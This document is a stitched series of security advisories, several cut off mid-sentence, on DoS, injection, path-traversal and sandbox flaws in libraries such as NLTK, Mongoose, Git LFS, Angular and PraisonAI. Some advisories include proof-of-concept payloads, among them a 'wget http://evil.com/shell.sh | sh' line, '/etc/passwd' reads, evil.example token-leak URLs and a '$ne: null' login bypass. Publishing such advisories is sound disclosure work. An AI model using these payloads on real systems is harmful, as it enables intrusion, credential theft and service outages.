`Tree.chomsky_normal_form()` binarizes a parse tree and defaults to right factoring. For a node with N children the right-factor branch repeatedly removes the first element of a working list with `list.pop(0)`, which shifts all remaining elements each time, so binarizing one wide node costs O(N^2). An application that converts an attacker-supplied treebank tree to Chomsky Normal Form can be forced into tens of seconds of single-threaded CPU by one wide flat tree. No authentication or user interaction is required.

## Root Cause

In the default right-factor branch the transform executes `curNode[0:] = [nodeCopy.pop(0), newNode]` inside a loop over the N children of a node. `list.pop(0)` is O(len) because it shifts every remaining element down by one; performed N-2 times over a shrinking length-N list this sums to O(N^2). The left-factor branch instead uses `nodeCopy.pop()` (removing the last element), which is O(1) and linear overall, so the two branches differ only by this front-versus-back removal. No cap is placed on the child count of a node, and the public `Tree.fromstring` parser accepts an arbitrarily wide bracketed tree.

```text
Affected function:
- nltk.tree.transforms.chomsky_normal_form (nltk/tree/transforms.py; right-factor sink at line 168, O(1) left control at line 179)
Public entry points: nltk.tree.Tree.chomsky_normal_form (nltk/tree/tree.py:455, default factor="right"); nltk.tree.Tree.fromstring (nltk/tree/tree.py:592).
```

## Impact

An attacker who can influence the tree that an application normalizes to Chomsky Normal Form causes sustained single-threaded CPU consumption (availability loss). The path is network-reachable (AV:N) and needs no privileges or user interaction (PR:N, UI:N). Because the cost grows quadratically with the attacker-chosen child count, roughly 1.5 MB of treebank input costs about 14 seconds on one core and scales as N^2 above that. Confidentiality and integrity are not affected. The NLTK regular-expression wall-clock timeout wraps regex matching only and does not wrap this pure-Python list loop.

advisories.summary: NLTK: Quadratic-time CPU denial of service in ConllCorpusReader SRL instance builder via nested span rescan
advisories.description:
## Summary

`ConllCorpusReader.srl_instances()` builds semantic-role-labeling instances from a CoNLL corpus block. For a sentence block with P predicates and P span columns, the instance builder rescans every span column (and every span within it) once per predicate while searching for each predicate's head, giving O(P^2 * R) work. A single well-formed block that places the head span in the last column forces the full scan on every predicate, so an application that reads an attacker-supplied CoNLL SRL corpus can be driven into tens of seconds of single-threaded CPU. No authentication or user interaction is required.

## Root Cause

`_get_srl_instances` iterates over the P predicates of a block; for each predicate it scans every span list and every span within it, using an inner `break` that stops only when a span tagged `V` or `C-V` containing the predicate word is found. When the sole head span is placed in the last span column, no earlier column matches, so the `for ... else: continue` construct traverses every span of every earlier column before matching. Over P predicates each scanning up to P columns of R spans, the cost is O(P^2 * R). The block is read whole with no size cap, and the grid-consistency check enforces only uniform column count, not a bound on P, R, or total work.

```

An attacker who can supply a CoNLL corpus that an application loads and iterates with `srl_instances()` causes sustained single-threaded CPU consumption (availability loss). The path is network-reachable through any corpus-ingestion surface (AV:N) and needs no privileges or user interaction (PR:N, UI:N). advisories.summary: Mongoose walks into inherited properties when hydrating, setting, and merging, allowing overwrites of built-in functions (denial of service) and shared schema state
advisories.description:
### Summary

Three Mongoose code paths copy data into objects by property name without checking whether the property is the object's own or inherited from its prototype:

1. Loading a document from the database (`init()`, also used by `Model.hydrate()`)
2. Setting a dotted path on a document (`$__set`, used by `new Model(obj)`, `doc.set()` and `doc.$set()`)
3. Merging update documents (`utils.mergeClone`, used by `findOneAndReplace()`, chained update calls and `Query.prototype.merge()`)

When a key names an inherited property, such as `toString` or `valueOf`, or a document internal such as `$__schema`, Mongoose writes into the shared object behind that property. The data comes from the attacker.

- **Denial of service.** For example, `{ "toString": { "call": 1 } }` overwrites `Object.prototype.toString.call`. Mongoose and most other libraries rely on `Object.prototype.toString.call()`. After the overwrite, every later query in the process throws `TypeError: _toString.call is not a function` until the process restarts. This includes queries on unrelated models.
- **Changing shared schema state.** Through a subdocument with `strict: false`, a path such as `profile.$__schema.paths.email.validators` reaches the subdocument's schema, which every document shares. Setting it to `[]` removes the `required` validator for every document in the process.

Mongoose already blocked `__proto__`, `constructor` and `prototype`, so these bugs cannot add properties to `Object.prototype` itself. They can still overwrite methods and properties of shared built-in functions and of Mongoose's internal objects.

### Details

#### 1. Loading documents: `init()`

```js
if (!schemaType && utils.isPOJO(value)) {
  // assume nested object
  if (!doc[i]) { doc[i] = {}; ... }
  init(self, value, doc[i], opts, path + '.');
}
```

For a stored field named `toString`, `doc[i]` is the inherited `Object.prototype.toString`. It is truthy, so `init()` recurses into that function and copies the stored subfields onto it.

This runs for every document Mongoose loads: `find()`, `findOne()`, cursors, populated documents and `Model.hydrate()`. It runs whatever the `strict` setting, and it applies to top-level and nested paths alike. `lean()` queries are not affected.

A malicious document can get into the collection in several ways:
- through a model with `strict: false`, for example `new Model(req.body).save()`;
- through another application or the raw MongoDB driver;
- through any update that write

advisories.summary: SiYuan has an Unauthenticated WebSocket DoS via Auth Keepalive Bypass
advisories.description:
## Summary
The SiYuan kernel WebSocket server accepts unauthenticated connections when a specific “auth keepalive” query parameter is present. After connection, incoming messages are parsed using unchecked type assertions on attacker-controlled JSON.

A remote attacker can send malformed messages that trigger a runtime panic, potentially crashing the kernel process and causing denial of service.

## Details
**1. Authentication Bypass via Keepalive Query**

Unauthenticated connections are accepted if the request URI matches a specific pattern intended for an authentication page keepalive.

**File: kernel/server/serve.go**

```
if !authOk {
    authOk = strings.Contains(s.Request.RequestURI, "/ws?app=siyuan") &&
             strings.Contains(s.Request.RequestURI, "&id=auth&type=auth")
}

```

**2. Unsafe Type Assertions on Untrusted Input**

Incoming JSON messages are parsed into a generic map and fields are accessed without validation.

**File: kernel/server/serve.go**

```
cmdStr := request["cmd"].(string)
cmdId  := request["reqId"].(float64)
param  := request["param"].(map[string]interface{})

```
Malformed or missing fields trigger a runtime panic.
The handler does not implement local panic recovery, allowing crashes to propagate.

## PoC
**Step 1 — Prepare workspace directory**

```sh
mkdir -p ./workspace
```

**Step 2 — Run SiYuan container**

```
docker run -d \
  -p 6806:6806 \
  -e SIYUAN_ACCESS_AUTH_CODE_BYPASS=true \
  -v $(pwd)/workspace:/siyuan/workspace \
  b3log/siyuan \
  --workspace=/siyuan/workspace
```

Service becomes reachable at http://127.0.0.1:6806

**Step 3 — Confirm service availability**

Open in browser:

```sh
http://127.0.0.1:6806
```

**Step 4 — Connect to unauthenticated WebSocket endpoint**

```sh
ws://127.0.0.1:6806/ws?app=siyuan&id=auth&type=auth
```

This connection is accepted without credentials.

**Step 5 — Send malformed payload**

Payload:

```sh

{}

```

**Step 6 — Observe behavior**

Monitor container logs:

```sh

docker logs -f <container_id>

```
## Impact
An unauthenticated attacker with network access can repeatedly crash the kernel, causing persistent denial of service.

Impact is highest when the service is exposed beyond localhost (e.g., Docker deployments, reverse proxies, LAN access, or public hosting).

advisories.summary: NLTK: Unbounded CPU consumption in SteppingRecursiveDescentParser.parse() with ambiguous or self-embedding grammars
advisories.description:
## Summary

`nltk.parse.recursivedescent.SteppingRecursiveDescentParser.parse()` performs an unbounded top-down search over ambiguous or self-embedding context-free grammars with no wall-clock or step limit. An actor who can influence the grammar and supply a short input to a caller that uses this parser can force a single `parse()` call to pin a CPU core indefinitely, producing a denial of service. The related base class `RecursiveDescentParser` gained a `max_time` wall-clock deadline, but the stepping subclass drives its own step loop and never arms or consults that deadline, and its constructor does not accept a `max_time` parameter, so the guard cannot be enabled on this path.

## Root Cause

`RecursiveDescentParser` bounds its recursive search inside `_parse`: it arms a wall-clock deadline on the first step and raises `TimeoutError` once `max_time` (default 5.0 seconds) is exceeded. `SteppingRecursiveDescentParser` was designed for interactive single-stepping and overrides both `parse()` and `_parse`. Its `parse()` runs `initialize()` followed by a `while self.step() is not None` loop that never enters the guarded base `_parse`. Its `_parse` override is a state-capturing stub that records history and returns a sentinel, and it never references the inherited `self._parse_deadline` or `self._max_time`. Its `__init__` signature omits `max_time` entirely, so a caller cannot enable or tighten a bound. The security invariant that a single parse must terminate within a bounded time is therefore never enforced on this parser.

```text
Affected component: nltk.parse.recursivedescent.SteppingRecursiveDescentParser
- parse()      nltk/parse/recursivedescent.py:428-433  (drives its own step loop, no bound armed or checked)
- _parse()     nltk/parse/recursivedescent.py:643-668  (stub override; never consults self._parse_deadline / self._max_time)
- __init__()   nltk/parse/recursivedescent.py:410-418  (signature (self, grammar, trace=0); no max_time parameter)
Base guard for comparison: RecursiveDescentParser._parse nltk/parse/recursivedescent.py:141-150
```

## Impact

An actor who controls or influences the grammar passed to `SteppingRecursiveDescentParser` and can supply a short token sequence to a caller that invokes `parse()` can cause that call to never return. The top-down search enumerates a derivation space that grows on the order of the Catalan numbers with no memoization of the search and no deadline, so one crafted grammar plus a short input determinist

advisories.summary: Forge: ReDoS in forge.http response header and cookie trimming
advisories.description:
`forge.http` trims response header and `Set-Cookie` values with the regular expression `/\s*$/`, which takes quadratic time on a long run of whitespace followed by another character. A server or on-path attacker can block a `forge.http` client for minutes with one large response header. Fixed in node-forge 1.4.3.

### Details
`_trimString()` in `lib/http.js` removes trailing whitespace with `str.replace(/\s*$/, '')`. On a string of n whitespace characters followed by a non-whitespace character, the regular expression engine tries a match at each of the n positions and scans the rest of the run each time, so the work is O(n^2). `forge.http` calls `_trimString()` on every response header value read by `response.readHeader()`, and again on cookie names and values in `response.getCookies()`. There is no limit on header size.

With Node.js 24, an 80 KB header value takes about 4 seconds to parse, and 1 MB about 10 minutes, during which the event loop (or browser tab) is blocked.

`forge.http` is not loaded by `require('node-forge')`. It is part of the `forge.all` bundle and needs a socket pool provided by the application (historically Flash sockets via `forge.xhr`), so few applications use it.

The fix trims trailing whitespace with a loop, as `lib/pem.js` has done since 1.4.1. The trimmed result is unchanged.

#### Patches
Fixed in node-forge 1.4.3.

#### Workarounds
Limit the size of HTTP response headers before passing them to `forge.http`, for example in the socket pool's data handler.

#### Resources
- Related: GHSA-7wch-p9px-956x (ReDoS in PEM decoding, fixed in 1.4.1): https://github.com/digitalbazaar/forge/security/advisories/GHSA-7wch-p9px-956x

CVSS 3.1: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (5.9, Moderate)

advisories.summary: mssql-mcp-core: SQL injection in mssql-mcp write tools via unparameterized table names and WHERE clauses
advisories.description:
Several tools in `mssql-mcp-core` built T-SQL by string-interpolating caller-supplied identifiers and predicates directly into the statement passed to the node-mssql `Request.query()` batch API. Only data values were parameterized.

Affected tools and inputs:
- `update_data`, `delete_data`: `tableName` and the free-form `whereClause` were interpolated raw.
- `insert_data`: `tableName` and column names (object keys) were interpolated raw.
- `execute_transaction`: the same raw `tableName`/`whereClause` interpolation per operation.
- `create_table`, `create_index`, `drop_table`: table/column/index/schema identifiers were interpolated with no or insufficient validation.
- `list_databases` (reader tier): the `stateFilter` argument was interpolated raw into the query, with only a non-enforced inputSchema enum guarding it.

The only check on `whereClause` was that it was non-empty. Because the row-count and preview queries run before the `confirmUpdate`/`confirmDelete` step, a malicious `whereClause` or `tableName` executed on the first call, bypassing the preview/confirmation and `maxRows` safety controls. `Request.query()` submits a multi-statement T-SQL batch, so a crafted input enabled stacked statements (arbitrary DDL/DML), sub-selects, and (with a privileged login and `xp_cmdshell` enabled) OS command execution. Because `list_databases` is a read-only tool, the `stateFilter` sink makes the reader package injectable as well.

## Impact

An actor who can supply tool arguments (a malicious or compromised MCP client, or an LLM agent steered via indirect prompt injection) could read, modify, or drop arbitrary data, bypass the `read_data` allow/deny validation and the preview/confirmation/`maxRows` safeguards, and conditionally achieve OS command execution.

## Patches

Fixed in `@connorbritain/mssql-mcp-core` 0.6.0:
- All identifiers are validated against a strict allowlist and bracket-quoted via a shared helper.
- The free-form `whereClause` string parameter is removed (breaking change) and replaced with structured, parameterized filters (`{ column, operator, value }`) using an operator allowlist. Values are always bound, never interpolated.
- `list_databases` validates `stateFilter` against a fixed allowlist before use.

Upgrade the consumer packages: `mssql-mcp-reader` 0.5.0, `mssql-mcp-writer` 0.5.0, `mssql-mcp-server` 0.6.0 (all depend on core `^0.6.0`).

## Workarounds

## 1. Executive Summary

JSON-java version 20260522 contains an unguarded path from an HTTP request body to unbounded `BigInteger` and `BigDecimal` construction. `JSONTokener.nextSimpleValue()` accumulates numeric characters into a `StringBuilder` with no length cap, then passes the full string to `JSONObject.stringToNumber()`, which calls `new BigInteger(val)` or `new BigDecimal(val)` directly. Both constructors have polynomial time complexity (O(n^1.585) for `BigInteger`).

A 488 KB JSON body — well within nginx's default 1 MB body-size limit — contains a 500,000-digit numeric literal that blocks the handling thread for approximately 3 seconds. Spring Boot has no default size limit for `application/json` request bodies. No parser configuration option (`withStrictMode`, `withKeepStrings`) prevents this. All three primary entry points are affected: `new JSONObject(String)`, `new JSONArray(String)`, and `XML.toJSONObject(String)`.

This vulnerability is distinct from CVE-2023-5072 (which addressed `StackOverflowError` from deeply nested JSON *structures* via a `try/catch` in `nextValue()`) and from CVE-2022-45688 (which addressed recursive XML nesting depth). The numeric string length issue has been present since BigInteger support was introduced in release 20150729 and has never been fixed in any subsequent release.

**Attack Complexity is rated High** because successful exploitation requires the target application to be using org.json specifically (rather than the default Jackson library used by Spring Boot), and requires the developer to have explicitly passed user-controlled input to `new JSONObject()` or equivalent. These are deployment conditions beyond the attacker's control. See Section 6 for the full CVSS rationale and Section 8 for the comparison with Jackson's treatment of the same issue class.

advisories.summary: Git LFS may execute arbitrary commands via crafted Git LFS configurations
advisories.description:
### Impact

When fetching objects from a malicious repository, Git LFS may execute an arbitrary command or binary after failing to sufficiently restrict the set of configuration options defined in an `.lfsconfig` file in the repository.

Git LFS permits a limited set of configuration options to be defined in an `.lfsconfig` file at the root of a Git repository, but does not filter these options correctly if their keys contain certain additional components, which allows an attacker to mimic options that configure Git LFS to use a custom command to transfer objects.  An attacker can then provide an arbitrary command which Git LFS will invoke when fetching objects.

Git LFS has resolved this issue by correctly restricting the configuration of custom object transfer commands to local Git configuration files.

### Patches

This problem exists in all versions since 1.3.0 and is patched in v3.8.1. All users should upgrade to v3.8.1.

### Workarounds

No single workaround exists other than to disable Git LFS entirely. As far as possible, users and administrators should avoid cloning repositories from untrusted sources.

### For more information

If you have any questions or comments about this advisory:
* For general questions, start a discussion in the Git LFS [discussion forum](https://github.com/git-lfs/git-lfs/discussions).
* For reports of additional vulnerabilities, please follow the Git LFS [security reporting policy](https://github.com/git-lfs/git-lfs/blob/main/SECURITY.md).

advisories.summary: NLTK: Uncontrolled recursion in CCG lexicon parser causes denial of service via deeply nested category input
advisories.description:
## Root Cause
The CCG lexicon parser recurses on nested parenthesised categories without any depth
bound. `matchBrackets` (`nltk/ccg/lexicon.py:154`) calls itself once per nested `(`, and
`augParseCategory` (`nltk/ccg/lexicon.py:228,242`) recurses once per bracketed
sub-category. Neither function tracks recursion depth nor checks
`sys.getrecursionlimit()`, and the public entry point `fromstring`
(`nltk/ccg/lexicon.py:252`, also re-exported via `nltk.ccg.chart.fromstring`) applies no
length or nesting cap before handing the text to the parser.

## Impact
An application that parses an untrusted lexicon string aborts with an unhandled
`RecursionError`, terminating the affected parse operation or request worker
(denial of service, CWE-674). The recursion is pure Python, so CPython raises a catchable
`RecursionError` rather than crashing the process; there is no memory-corruption or
code-execution primitive. Confidentiality and integrity are unaffected. Plausibly, a
service that does not wrap the parse in a handler will surface the error to the caller and
drop the in-flight request.

## Attack Chain
1. The application calls `nltk.ccg.lexicon.fromstring(lex_str)` with attacker-supplied
   text such as `":- S\nw => " + "(" * 2000 + "S" + ")" * 2000 + "\n"`.
2. `fromstring` splits the input into lines; `LEX_RE`/`RHS_RE`
   (`nltk/ccg/lexicon.py:275-276`) match and route the parenthesised category into
   `augParseCategory` (`nltk/ccg/lexicon.py:277`) with no depth or length guard.
3. Because the category starts with `(`, `nextCategory` dispatches to `matchBrackets`,
   which recurses once per nested `(`; `augParseCategory` recurses once per bracketed
   sub-category. Each nesting level consumes call-stack frames.
4. Once the depth exceeds the interpreter recursion limit, an unhandled `RecursionError`
   propagates out of the public API and aborts the parse.

## Bypass Evidence
Running the dependency-free `matchBrackets` body verbatim from the shipped source at the
default recursion limit (1000): a well-formed balanced input at depth 5 and 500 parses
cleanly, while depth 2000 and 5000 raise an unhandled `RecursionError`. Because shallow,
balanced input parses without error, the failure is depth-driven rather than a generic
parse error. The crash triggers near ~1000 nesting levels at the default limit, so the
payload need not be extreme. A repository-wide search confirms no depth/recursion guard
exists anywhere under `nltk/ccg/` (the only recent change to this file

advisories.summary: Servo Sandbox bypass: declarative refresh can auto-navigate a sandboxed iframe
advisories.description:
A sandboxed iframe can auto-navigate itself via declarative refresh even when automatic features should be blocked. This allows attacker-controlled embedded content to redirect itself without user action.

### Summary
Servo allows a sandboxed iframe to auto-navigate itself via declarative refresh in configurations that should block automatic features.

The issue reproduces in the must-block rows of the matrix:

- `sandbox=""`
- `sandbox="allow-same-origin"`
- `sandbox="allow-forms"`
- `sandbox="allow-same-origin allow-forms"`

This is a client-side sandbox-policy bypass. It does not by itself prove script execution or parent DOM access, but it does let attacker-controlled sandboxed content redirect itself without user action.

### Details
The declarative refresh path is missing sandbox enforcement:

- [components/script/dom/document/document.rs:239] `RefreshRedirectDue::invoke()` contains `TODO: check sandbox`
- [components/script/dom/document/document.rs:4522] the refresh scheduler contains `TODO: handle active sandboxing flag`

The implementation currently schedules and executes the refresh without enforcing the sandboxed automatic-features restriction described by the HTML spec comments in the same code.

What I observed:

- In Servo, the must-block rows above navigated successfully.
- In Chrome, the same rows were blocked.

### PoC
Serve the HTML files in this folder over HTTP.

Files:
- [child.html](https://github.com/user-attachments/files/27770907/child.html)
- [success.html](https://github.com/user-attachments/files/27770910/success.html)
- [viewer.html](https://github.com/user-attachments/files/27770911/viewer.html)

Steps:

1. Open `viewer.html` over HTTP.
2. The page shows a visible sandboxed iframe.
3. In a correct browser, the iframe stays on `child.html`.
4. In Servo, the iframe visibly turns into the `success.html` page.

### Impact
This is a client-side sandbox-policy bypass.

Confirmed impact:

- autonomous iframe self-navigation in sandbox configurations that should block it
- framed phishing / content swap after initial render
- redirect loops / annoyance / limited DoS

advisories.summary: @angular/common: XSRF Token Leakage via URL Parsing Discrepancy in Angular HTTP Client (Incomplete fix for CVE-2025-66035)
advisories.description:
An incomplete fix for [GHSA-58c5-g7wp-6w37](https://github.com/angular/angular/security/advisories/GHSA-58c5-g7wp-6w37) (`CVE-2025-66035`) in `@angular/common`'s HTTP Client (`HttpClient`) allows Cross-Site Request Forgery (XSRF) tokens to be leaked to attacker-controlled cross-origin domains when requests use URLs that exploit parsing discrepancies between regular expressions and the browser's WHATWG URL parser.

### Technical Description

To address `CVE-2025-66035`, `xsrfInterceptorFn` introduced a regular expression (`const ABSOLUTE_URL_REGEX = /^(?:https?:)?\/\//i`) to detect and skip absolute and protocol-relative URLs before attaching the `X-XSRF-TOKEN` header.

However, browsers resolve request URLs passed to `fetch()` and `XMLHttpRequest.open()` using the **WHATWG URL parser**. For `http:` and `https:` schemes, the WHATWG URL standard performs several normalizations prior to resolving the authority/origin:
* Backslashes (`\`) are treated as forward slashes (`/`) — e.g., `/\evil.example/x`, `\\evil.example/x`, `\/evil.example/x`, `https:\\evil.example/x`, `https:/\evil.example/x`.
* Leading and trailing C0 control characters and spaces (`<= 0x20`) are stripped — e.g., `' //evil.example/x'`, `'\0//evil.example/x'`, `'\x1f//evil.example/x'`.
* ASCII tab (`\t`), newline (`\n`), and carriage return (`\r`) characters are removed anywhere in the input — e.g., `'/\t/evil.example/x'`, `'/\n/evil.example/x'`, `'htt\tps://evil.example/x'`.

Because these URLs do not match `/^(?:https?:)?\/\//i`, `xsrfInterceptorFn` treats them as relative same-origin URLs and attaches the `X-XSRF-TOKEN` header, while the browser resolves and dispatches the request to the cross-origin host (`evil.example`).

Note: Angular `21.0.3+` and `22.x` replaced the regular expression with a WHATWG `new URL(req.url, locationOrigin)` origin comparison in [#65683](https://github.com/angular/angular/pull/65683) and were already unaffected. However, the `20.3.x` LTS branch retained the regular expression until `20.3.34`.

### Impact

The token leakage bypasses Angular's built-in XSRF protection on affected versions, allowing an attacker to capture the user's valid `X-XSRF-TOKEN` header if their server permits the request and custom header via CORS. Once obtained, the attacker can perform Cross-Site Request Forgery (CSRF) attacks against the victim user's session.

1. The victim's Angular application must have **XSRF protection enabled** (enabled by default in `Http

advisories.summary: PraisonAI has an incomplete fix for CVE-2026-34935 - OS Command Injection
advisories.description:
### Summary

The fix for PraisonAI's MCP command handling does not add a command allowlist or argument validation to `parse_mcp_command()`, allowing arbitrary executables like `bash`, `python`, or `/bin/sh` with inline code execution flags to pass through to subprocess execution.

### Affected Package

- **Ecosystem:** PyPI
- **Package:** MervinPraison/PraisonAI
- **Affected versions:** < 47bff65413be
- **Patched versions:** >= 47bff65413be

### Details

The vulnerability exists in `src/praisonai/praisonai/cli/features/mcp.py` in the `MCPHandler.parse_mcp_command()` method. This function parses MCP server command strings into executable commands, arguments, and environment variables. The pre-patch version performs no validation on the executable or arguments.

The fix commit `47bff654` was intended to address command injection, but the patched `parse_mcp_command()` still lacks three critical controls: there is no `ALLOWED_COMMANDS` allowlist of permitted executables (e.g., `npx`, `uvx`, `node`, `python`), there is no `os.path.basename()` validation to prevent path-based executable injection, and there is no argument inspection to block shell metacharacters or dangerous subcommands.

Malicious MCP server commands such as `python -c 'import os; os.system("id")'`, `bash -c 'cat /etc/passwd'`, and `/bin/sh -c 'wget http://evil.com/shell.sh | sh'` are all accepted by `parse_mcp_command()` and passed directly to subprocess execution without filtering.

### PoC

```python
#!/usr/bin/env python3
"""
CVE-2026-34935 - PraisonAI command injection via parse_mcp_command()

Tests against REAL PraisonAI mcp.py from git at commit 66bd9ee2 (parent of fix 47bff654).
The pre-patch parse_mcp_command() performs NO validation on the executable or
arguments, allowing arbitrary command execution via MCP server commands.

Repo: https://github.com/MervinPraison/PraisonAI
Patch commit: 47bff65413beaa3c21bf633c1fae4e684348368c
"""

import sys
import os
import importlib.util

# Load the REAL mcp.py from the cloned PraisonAI repo at vulnerable commit
MCP_PATH = "/tmp/praisonai_real/src/praisonai/praisonai/cli/features/mcp.py"

def load_mcp_handler():
    """Load the real MCPHandler class from the vulnerable source."""
    base_path = "/tmp/praisonai_real/src/praisonai/praisonai/cli/features/base.py"

    spec_base = importlib.util.spec_from_file_location("features_base", base_path)
    mod_base = importlib.util.module_from_spec(spec_base)
    sys.modules["features_base"] = mod_base

advisories.summary: AutoMapper: Denial of Service via uncontrolled recursion that bypasses MaxDepth
advisories.description:
### Summary
The default and explicit `MaxDepth` limits added for CVE-2026-32933 don't apply to several mapping paths. Mapping a deeply nested source through any of them recurses without bound and throws a `StackOverflowException`, which can't be caught and terminates the process.

### Affected paths
- **Polymorphic maps:** derived type maps (`Include` / `IncludeBase`) didn't inherit the base map's `MaxDepth`, and the default limit for self-referential maps was only applied to the base map. A chain of derived objects was mapped without a limit, even with `MaxDepth` set on the base map.
- **Runtime-typed members:** members typed as `object` or an interface aren't seen by self-reference detection, so the default limit isn't applied.
- **Dictionary and dynamic sources:** mapping a nested `Dictionary<string, object>` or `ExpandoObject` (for example, deserialized JSON) onto typed destinations recurses with no depth tracking. `MaxDepth` has no effect.
- **Recursive type converters:** `ConvertUsing` that calls `context.Mapper.Map` ignores `MaxDepth`.

### Impact
An application that maps attacker-influenced, deeply nested data through one of these paths can be crashed. On a 1 MB stack (the Windows default), a few thousand levels of nesting are enough.

### Fix
- Derived type maps inherit `MaxDepth`, and the default limit is applied to them.
- Every runtime map call checks for sufficient stack, and fails with a catchable `InsufficientExecutionStackException` instead of overflowing.

### Workarounds
Set `MaxDepth` explicitly on derived maps and on maps reached through `object` or interface members. There is no configuration workaround for dictionary or dynamic sources, or for recursive type converters, other than limiting input depth before mapping.

### Related
- CVE-2026-32933 (GHSA-rvv3-g6hj-g44x)
- GHSA-6vhm-j9h7-f9gh: `MaxDepth` not enforced through constructor parameters and positional records, fixed in the same releases.

advisories.summary: Soup Sieve: Polynomial-time denial of service in the descendant combinator
advisories.description:
## Summary

Matching a selector that uses the descendant combinator (`a b`) takes time that grows polynomially with how deeply the document is nested, and each extra descendant combinator in the selector raises the degree by one. A selector with `k` descendant combinators takes `O(n^(k+1))` time on a chain of `n` nested elements.

An attacker who controls the HTML or XML that an application passes to Soup Sieve (directly, or through Beautiful Soup's `select()`, `select_one()`, `css.select()`, etc.) can send a very small, deeply nested document that keeps a CPU busy for seconds to minutes against an ordinary selector such as `section div div`.

## Details

To match `a b`, Soup Sieve checks each element against `b` and then walks up through its ancestors looking for one that matches `a`. When the selector has more descendant combinators, the rest of the selector is tried again from each ancestor on that walk, and so on for every combinator. Nothing was reused between walks, so the same ancestors were matched against the same part of the selector over and over.

The worst case is when the leftmost part of the selector never matches, as in `section div div` against a document of nested `<div>` with no `<section>`: every walk goes all the way to the root and no search can stop early.

### Timings

Example timings with `html.parser` on Soup Sieve 3.0.4 and 4.0, using a document of nested `<div>` (5 bytes each) and no matches:

| Nesting depth | Input size | Selector | 3.0.4 | 4.0 |
| --- | --- | --- | --- | --- |
| 2,000 | 10 KB | `section div` | 1.6 s | 0.05 s |
| 4,000 | 20 KB | `section div` | 5.1 s | 0.01 s |
| 400 | 2 KB | `section div div` | 6.7 s | < 0.01 s |
| 800 | 4 KB | `section div div` | 53.0 s | < 0.01 s |
| 100 | 0.5 KB | `section div div div` | 2.5 s | < 0.01 s |
| 200 | 1 KB | `section div div div` | 40.9 s | < 0.01 s |

None of these selectors use unusual syntax.

## Proof of concept

```py
import time
import bs4
import soupsieve as sv

soup = bs4.BeautifulSoup('<div>' * 200, 'html.parser')
t = time.process_time()
sv.select('section div div div', soup)
print(time.process_time() - t)
```

On affected versions, doubling the nesting depth multiplies the time by about 2^(k+1), where `k` is the number of descendant combinators: about 4x for `section div`, 8x for `section div div`, and 16x for `section div div div`.

## Impact

Applications are affected if they run selectors with descendant combinators against documents that untrusted users can influ

advisories.summary: Mongoose: Connection-level sanitizeFilter not applied
advisories.description:
### Summary

sanitizeFilter exists to stop query selector injection: it wraps operator objects such as `{ $ne: null }` in filter values in `$eq`, so they are matched literally. Set on a connection with `mongoose.connect()` or `createConnection(uri, { sanitizeFilter: true })`, the connection reports it as enabled but queries never apply it. An application that relies on the connection-level option and passes an attacker-controlled object into a filter therefore remains open to selector injection, and a password value of `{ $ne: null }` returns the account record without the password.

### Details

`NativeConnection#createClient()` at `lib/drivers/node-mongodb-native/connection.js:270-272` moves `options.sanitizeFilter` into `Connection.config` and deletes the original option. `Query#_castConditions()` at `lib/query.js:2413-2423` checks `Connection.options`, the global `options`, and the per-query options, but never `Connection.config`. The defense therefore does not run even though `Connection#get('sanitizeFilter')` returns true. This storage was introduced in Mongoose 6.0.0 and the same mismatch is present in 9.11.2.

### Proof of concept

```javascript
import mongoose from 'mongoose'

const conn = await mongoose.createConnection('<MONGODB_URI>', { sanitizeFilter: true }).asPromise()
const User = conn.model('User', new mongoose.Schema({
  username: String,
  password: String,
  marker: String
}))

await User.create({
  username: 'victim',
  password: 'correct-password',
  marker: 'PROTECTED_RECORD'
})

const filter = { username: 'victim', password: { $ne: null } }
console.log(conn.get('sanitizeFilter'))
console.log((await User.findOne(filter).lean()).marker)
```

A control query with a literal wrong password returned no document in the same run, confirming the filter is otherwise enforced.

### Impact

Connection-level `sanitizeFilter` option is not respected. Any user that relies on connection-level config and `sanitizeFilter` to defend against query selector injection is affected. Users that set `sanitizeFilter` globally using `mongoose.set('sanitizeFilter')` or on specific queries using `Model.find().sanitizeFilter()` are not affected.

advisories.summary: logto-tunnel serves files outside `--experience-path` via path traversal
advisories.description:
### Summary

`@logto/tunnel` serves custom sign-in experience files from the `--experience-path` directory. When the tunnel service is reachable, a requester can use `../` path segments in a static asset request to read files outside that directory that the CLI process can read.

### Details

The tunnel command accepts `--experience-path` as the local folder path for custom sign-in experience assets. `packages/tunnel/src/commands/tunnel/index.ts` enables `createStaticFileProxy(path)` when that option is set and sends non-Logto, non-`--experience-uri` requests to that static proxy. The server is started with `server.listen(port)`.

`packages/tunnel/src/commands/tunnel/utils.ts` builds the filesystem path as `path.join(staticPath, fallBackToIndex ? index : request.url)`. For file asset paths, `request.url` is used directly. A request URL such as `/../secret.txt` resolves outside `staticPath` and is then opened with `fs.open(requestPath, 'r')`. There is no URL normalization and no containment check that the resolved path remains under the configured static directory before the file is read and returned.

The proof boundary is the packaged CLI end-to-end run. The filesystem read primitive was validated with equivalent Node HTTP handling for the affected code path, including that Node preserves `/../secret.txt` in `request.url` and that bare `server.listen(port)` binds to all interfaces on this platform.

### PoC

1. Create a custom UI directory at `/tmp/logto-ui/static` with `/tmp/logto-ui/static/index.html`.
2. Create a sibling file outside the static root, for example `/tmp/logto-ui/secret.txt`.
3. Start the tunnel with `logto-tunnel --endpoint https://<tenant-id>.logto.app --port 9000 --experience-path /tmp/logto-ui/static`.
4. Request `http://<host>:9000/../secret.txt`.
5. The response body contains the contents of `/tmp/logto-ui/secret.txt`.

### Impact

The observed result is arbitrary file read outside the configured custom UI static directory. If the tunnel port is reachable from another host, an unauthenticated network peer can read local files readable by the `logto-tunnel` process, including development secrets or credentials stored near the custom UI project.

advisories.summary: Git LFS may execute arbitrary commands via crafted Git configurations
advisories.description:
### Impact

When fetching objects from a malicious repository, Git LFS may execute an arbitrary command or binary after incorrectly parsing the Git configuration options defined for a submodule.

Git LFS reads Git configuration options without checking for embedded line-ending control characters.  By inserting control characters such as line feed (LF) into certain values, an attacker may be able to mimic options that cause Git LFS to execute an arbitrary command when fetching or adding objects.

Git LFS has resolved this issue by always using an unambiguous format to read and parse Git configuration options.

### Patches

This problem exists in all versions since 0.6.0 and is patched in v3.8.1. All users should upgrade to v3.8.1.

### Workarounds

To work around the problem, users should prevent Git from initializing any submodules by disabling the `fetch.recurseSubmodules` and `submodule.recurse` configuration options and by never running the `git submodule init` command.  Any submodules which have already been initialized in a repository may be deactivated with the `git submodule deinit` command.

### For more information

If you have any questions or comments about this advisory:
* For general questions, start a discussion in the Git LFS [discussion forum](https://github.com/git-lfs/git-lfs/discussions).
